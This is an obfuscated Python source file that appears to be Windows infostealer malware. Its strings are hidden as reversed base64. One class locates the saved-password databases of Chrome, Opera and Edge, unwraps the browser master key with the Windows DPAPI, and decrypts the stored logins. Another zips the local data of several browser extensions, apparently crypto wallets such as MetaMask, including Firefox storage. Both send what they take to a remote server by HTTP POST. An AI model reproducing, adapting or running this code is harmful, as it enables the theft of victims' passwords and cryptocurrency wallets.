c='note'
b='file'
a='lNWa2VGZ'
Z='=IXZzd3byJ2XiV2d'
P='%s'
L=str
J=Exception
I=open
C=print
B=None
import os as A,re,sys,json,base64 as d,sqlite3 as e,win32crypt as f
from Cryptodome.Cipher import AES
import shutil as Q,glob as E,requests as M
from ganache.utils import G as R,I as g,H as h,J as N,K
D='BRVQEBFUBxUQD9ET'
F='==QQUFERQBVQ'
i='==QY0FGRg4Wan9GTcxlKlxWam9mcQxFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
j='hRXYEBibpd2bMxFX0xWdhZWZExFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
k='==QZ0FGdTBCbhN2bMxFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
l='hRXYEBibpd2bMxFXlxmYhR3UgEmclB3TcxVZyF2d0Z2bTBSYyVGcPxFX'
m='==QZ0FGdTBCbhN2bMxFXlxmYhR3UgEmclB3TcxVZyF2d0Z2bTBSYyVGcPxFX'
n='=EGdhREIul2ZvxEXcpSZslmZvJHUcxVY0FGRgIXZzVFXcV2ZkVEXcRnZvN3byNWaNxFX'
o='==QY0FGRg4Wan9GTcxFdsVXYmVGRcxVY0FGRgIXZzVFXcV2ZkVEXcRnZvN3byNWaNxFX'
p='=UGdhR3UgwWYj9GTcxVY0FGRgIXZzVFXcV2ZkVEXcRnZvN3byNWaNxFX'
q='==Qelt2XkVGdwlncj5WZ'
O='==gYk5CdsVXY25Wan9GT'
r='==wcul2ZvxGIN9kUGBSZ1xWY29FZy92dzNXYwBCLlVHbhZ3Xl1WYuJXZzVHIswmc19lbvlGdjFGIUNURMV0U'
s='==QZ0l2c'
t='=UWbh5mclNXd'
u='=Qmcvd3czFGc'
G=Z
H=a
S='l12byh2Y'
T='=EmclB3b'
U='=U2ZkV2X0Z2bz9mcjlWb'
v='=Qnb192YjF2L'
w='=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ'
x='=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ'
y='=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb'
V='=gGckdGcwVWZi5GZiNmYk52bjRGajlGbnBnYqRWaqdWZ'
z='cxlKlxWam9mcQxFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
A0='=wFX0xWdhZWZExFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
A1='=wFXlxmYhR3UgEmclB3TcxVZyF2d0Z2bTBSYyVGcPxFX'
A2='==AXcpSZslmZvJHUcxVY0FGRgIXZzVFXcV2ZkVEXcRnZvN3byNWaNxFX'
A3='cxFdsVXYmVGRcxVY0FGRgIXZzVFXcV2ZkVEXcRnZvN3byNWaNxFX'
A4='=8ycn5Wa0RXZTBibvl2cuVGd4VEIsF2Yvx0L'
A5='0VGbsF2dfR3c1JHd'
W='=s2ch1WY0VWb'
H=a
G=Z
X='==QZwlHd'
Y='=Qnbl1GajFGd0F2L'
A6='zpmLzZWZyB3Lq8yclxWam9mcQ9CevZWZylmRvEGbslmev10L'
A7='iwFXpsSXi41WoICXcpjIcx1bp5yazFWbhRXZtBkbvl2cuVGd4VmYldnI'
A8='rsyKu9Waz5WZ0hXZto3bt9CdsVXYmVGZvU2ZhJ3b0N3L'
A9='==AevZWZylmZ'
class AA:
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __cr_ld_paths(F):
		B=E.glob(A.getenv(K(D))+K(i));C=A.getenv(K(D))+K(j)
		if A.path.exists(C):B.append(C)
		return B
	def __cr_ls_path(C):
		B=A.getenv(K(D))+K(k)
		if A.path.exists(B):return B
	def __op_ld_path(C):
		B=A.getenv(K(F))+K(l)
		if A.path.exists(B):return B
	def __op_ls_path(C):
		B=A.getenv(K(F))+K(m)
		if A.path.exists(B):return B
	def __me_ld_paths(F):
		B=E.glob(A.getenv(K(D))+K(n));C=A.getenv(K(D))+K(o)
		if A.path.exists(C):B.append(C)
		return B
	def __me_ls_path(C):
		B=A.getenv(K(D))+K(p)
		if A.path.exists(B):return B
	def __get_sk(G,login_state_path):
		try:
			with I(login_state_path,'r',encoding='utf-8')as E:D=E.read();D=json.loads(D)
			A=d.b64decode(D['os_crypt'][K(q)]);A=A[5:];A=f.CryptUnprotectData(A,B,B,B,0)[1];return A
		except J as F:C(P%L(F));C('[ERR] 1001');return
	def __dc_payload(A,cipher,payload):return cipher.decrypt(payload)
	def __generate_cipher(A,aes_key,iv):return AES.new(aes_key,AES.MODE_GCM,iv)
	def __dc_p(B,ciphertext,secret_key):
		D=ciphertext
		try:E=D[3:15];F=D[15:-16];G=B.__generate_cipher(secret_key,E);A=B.__dc_payload(G,F);A=A.decode();return A
		except J as H:C(P%L(H));C('[ERR] 1002');return''
	def __get_db_connection(B,chrome_path_login_db):
		try:Q.copy2(chrome_path_login_db,K(O));return e.connect(K(O))
		except J as A:C(P%L(A));C('[ERR] 1003');return
	def __handle(D,login_data_path,login_state_path,browser_name):
		N=[]
		try:
			P=D.__get_sk(login_state_path);E=D.__get_db_connection(login_data_path)
			if P and E:
				F=E.cursor();F.execute(K(r))
				for(U,I)in enumerate(F.fetchall()):
					Q=I[0];R=I[1];M=I[2]
					if M!=B and M!='':S=D.__dc_p(M,P);N.append({K(s):Q[:100]if Q is not B else B,K(t):R[:100]if R is not B else B,K(u):S[:100]if S is not B else B,K(G):browser_name,K(H):D.device_id})
				F.close();E.close();A.remove(K(O))
		except J as T:C('[ERR] '%L(T))
		return N
	def __handle_cr(A):
		C=A.__cr_ls_path();D=[]
		if C is not B:
			E=A.__cr_ld_paths()
			for F in E:D.append(A.__handle(login_data_path=F,login_state_path=C,browser_name=K(S)))
		return N(D)
	def __handle_op(A):
		C=A.__op_ls_path();D=A.__op_ld_path()
		if C is not B and D is not B:return A.__handle(login_data_path=D,login_state_path=C,browser_name=K(T))
		return[]
	def __handle_me(A):
		C=A.__me_ls_path();D=[]
		if C is not B:
			E=A.__me_ld_paths()
			for F in E:D.append(A.__handle(login_data_path=F,login_state_path=C,browser_name=K(U)))
		return N(D)
	def run(B):
		A=[];A.append(B.__handle_cr());A.append(B.__handle_me());A.append(B.__handle_op());A=N(A)
		try:
			D=M.post(B.base_url+K(v),json=A)
			if D.status_code<200 or D.status_code>=300:C('Error 21: Unknown error')
		except:C('Error -21: Unknown error')
class AB:
	id_list=[K(w),K(x),K(y),K(V)]
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __cr_data_paths(F):
		B=E.glob(A.getenv(K(D))+K(z));C=A.getenv(K(D))+K(A0)
		if A.path.exists(C):B.append(C)
		return B
	def __op_data_path(C):
		B=A.getenv(K(F))+K(A1)
		if A.path.exists(B):return B
	def __me_data_paths(F):
		B=E.glob(A.getenv(K(D))+K(A2));C=A.getenv(K(D))+K(A3)
		if A.path.exists(C):B.append(C)
		return B
	def __handle(B,path,browser):
		for id in B.id_list:
			E=path+K(A4)+id
			if A.path.exists(E):
				F='ganache/'+g(5);h(E,F);D='ganache/mtm.zip';type=K(W)
				if id==K(V):D='ganache/tw.zip';type=K(A5)
				R(F,D);L={b:I(D,'rb')};N={K(H):B.device_id,K(G):browser,K(X):type,c:id}
				try:
					J=M.post(B.base_url+K(Y),data=N,files=L)
					if J.status_code<200 or J.status_code>=300:C('Error 22: Unknown error')
				except:C('Error -22: Unknown error')
	def __handle_ff(L):
		S='ganache/mtmf.zip';T=E.glob(A.getenv(K(F))+K(A6))
		for B in T:
			with I(B,'r', encoding='utf-8', errors='ignore')as D:
				U=D.read();N=re.search(K(A7),U)
				if N:
					id=N.group(1);V=A.path.dirname(B)+K(A8)+id+'^userContextId=*';O=E.glob(V)
					if len(O)>0:
						J=O[0];Q.copy2(B,J+'/prefs.js');R(J,S);D={b:I(S,'rb')};Z={K(H):L.device_id,K(G):K(A9),K(X):K(W),c:A.path.basename(J)}
						try:
							P=M.post(L.base_url+K(Y),data=Z,files=D)
							if P.status_code<200 or P.status_code>=300:C('Error 23: Unknown error')
						except:C('Error -23: Unknown error')
	def run(A):
		for C in A.__cr_data_paths():A.__handle(C,K(S))
		for C in A.__me_data_paths():A.__handle(C,K(U))
		D=A.__op_data_path()
		if D is not B:A.__handle(D,K(T))
		A.__handle_ff()